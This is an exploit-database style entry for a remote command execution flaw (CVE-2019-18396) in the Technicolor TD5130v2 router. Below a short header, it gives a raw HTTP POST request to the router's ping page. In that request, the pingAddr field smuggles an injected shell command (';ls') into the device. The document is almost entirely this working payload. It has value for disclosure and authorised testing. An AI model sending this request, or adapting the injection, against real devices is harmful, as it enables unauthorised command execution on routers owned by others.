# Exploit Title: Technicolor TD5130.2 - Remote Command Execution
# Date: 2019-11-12
# Exploit Author: João Teles
# Vendor Homepage: https://www.technicolor.com/
# Version: TD5130v2
# Firmware Version: OI_Fw_V20
# CVE : CVE-2019-18396

---------------------------

POST /mnt_ping.cgi HTTP/1.1
Host: HOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http:/HOST/mnt_ping.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Cookie: session=COOKIE
Connection: close
Upgrade-Insecure-Requests: 1

isSubmit=1&addrType=3&pingAddr=;ls&send=Send